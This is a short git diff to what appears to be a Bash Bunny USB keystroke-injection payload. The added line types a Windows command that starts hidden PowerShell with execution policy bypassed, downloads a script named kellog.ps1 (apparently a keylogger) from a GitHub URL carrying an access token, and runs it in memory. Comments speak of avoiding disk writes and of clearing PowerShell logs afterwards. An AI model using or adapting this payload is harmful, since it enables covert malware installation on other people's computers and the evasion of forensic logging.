@@ -10,15 +10,13 @@
 
 # Setup bunny
 LED SETUP
-mkdir /loot/testing
-rm -rf /loot/testing/*
-echo test > /loot/testing/loot_test.txt
 ATTACKMODE HID
 
 # Payload deployment
 LED STAGE1
 # Download and execute kellog.ps1, preferably in memory without dropping to disk
 # Might have to clear powershell logs afterwards =[
+RUN WIN "powershell -windowstyle hidden -noprofile -ep bypass wget https://raw.githubusercontent.com/EPiC-Inc/My-Collection/master/kellog.ps1?token=AWpkiLOIe0Awb0vtgYCHCPgq-h-IiwEpks5cQRHSwA%3D%3D | select-object -expandproperty content | powershell -windowstyle hidden -noprofile -ep bypass"
 
 # Finished! Safe to unplug
 LED FINISH
